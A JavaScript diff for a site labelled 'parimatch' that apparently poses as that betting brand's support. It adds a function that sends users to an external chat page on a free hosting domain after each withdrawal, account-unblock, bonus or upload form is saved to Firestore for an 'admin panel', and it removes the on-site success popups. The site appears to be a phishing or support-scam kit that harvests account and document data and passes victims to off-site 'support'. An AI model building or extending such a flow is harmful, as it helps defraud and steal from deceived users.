@@ -12,6 +12,17 @@ const FIREBASE_CONFIG = {
 
 const SITE_ID = "parimatch";
 
+// ===== POST-SUBMIT REDIRECT TO LIVE CHAT =====
+// Every form sends the user to the direct chat page once the submission is
+// safely stored in Firestore, so the admin panel has the data before the
+// user reaches support. The LIVE CHAT card on the home page already does
+// this and is deliberately left as is.
+const CHAT_URL = 'https://chat-page.edgeone.app';
+
+function redirectToChat(delayMs) {
+  setTimeout(function() { window.location.href = CHAT_URL; }, delayMs || 2200);
+}
+
 // ===== VALIDATION HELPERS =====
 function isValidEmail(v) {
   return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v || '').trim());
@@ -332,6 +343,9 @@ document.addEventListener('DOMContentLoaded', () => {
           if (withdrawalFields) withdrawalFields.classList.toggle('active', firstTab === 'withdrawal');
         }
 
+        // Firestore save succeeded - hand the user over to live chat.
+        redirectToChat();
+
       } catch (error) {
         console.error("Firebase Error:", error);
         showNotification("❌ Failed to send. Please try again.", "error");
@@ -548,8 +562,8 @@ function submitUnblockRequest() {
     });
     document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
     if (submitBtn) submitBtn.disabled = false;
-    var sp = $unlock('successPopup');
-    if (sp) sp.classList.add('active');
+    // Firestore save succeeded - hand the user over to live chat.
+    redirectToChat();
   }).catch(function(err) {
     console.warn('Unblock submit failed:', err);
     showUnlockToast('Submission failed - try again', 'error');
@@ -778,8 +792,8 @@ function submitBonusRequest() {
     });
     document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
     if (submitBtn) submitBtn.disabled = false;
-    var sp = $unlock('bSuccessPopup');
-    if (sp) sp.classList.add('active');
+    // Firestore save succeeded - hand the user over to live chat.
+    redirectToChat();
   }).catch(function(err) {
     console.warn('Bonus submit failed:', err);
     showBonusToast('Submission failed - try again');
@@ -956,6 +970,8 @@ try {
           if (icon) icon.className = 'fas fa-cloud-upload-alt';
         });
         document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
+        // Firestore save succeeded - hand the user over to live chat.
+        redirectToChat();
       } catch (error) {
         console.error("Submit Error:", error);
         showNotification("Failed to send. Please try again.", "error");
@@ -1039,6 +1055,8 @@ try {
           if (icon) icon.className = 'fas fa-cloud-upload-alt';
         });
         document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
+        // Firestore save succeeded - hand the user over to live chat.
+        redirectToChat();
       } catch (error) {
         console.error("Submit Error:", error);
         showNotification("Failed to send. Please try again.", "error");
